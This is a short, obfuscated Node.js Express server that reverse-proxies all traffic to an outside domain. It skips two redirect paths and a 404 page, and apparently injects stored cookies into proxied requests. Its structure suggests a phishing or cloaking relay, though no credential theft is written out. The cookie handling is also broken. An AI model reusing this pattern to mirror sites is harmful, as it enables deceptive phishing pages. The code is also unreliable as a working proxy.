const express = require('express')
const cookieParser = require('cookie-parser')
const { createProxyMiddleware } = require('http-proxy-middleware')
const app = express()
const cookies = []
app.use(cookieParser())
const proxyMiddleware = createProxyMiddleware({
  target: 'https://www.brunysixlwork.site',
  changeOrigin: true,
  onProxyReq: (_0x87408e) => {
    cookies.forEach((_0x10b550) => {
      _0x87408e.setHeader('Set-Cookie', _0x10b550.name + '=' + _0x10b550.value)
    })
  },
})
app.use((_0x37cfa3, _0x28b238, _0x5981cc) => {
  if (
    _0x37cfa3.url !== '/redirect1' &&
    _0x37cfa3.url !== '/redirect2' &&
    _0x37cfa3.url !== '/404.html'
  ) {
    proxyMiddleware(_0x37cfa3, _0x28b238, _0x5981cc)
  } else {
    _0x5981cc()
  }
})
app.listen(5000, () => {
  console.log('Listening on port 5000')
})
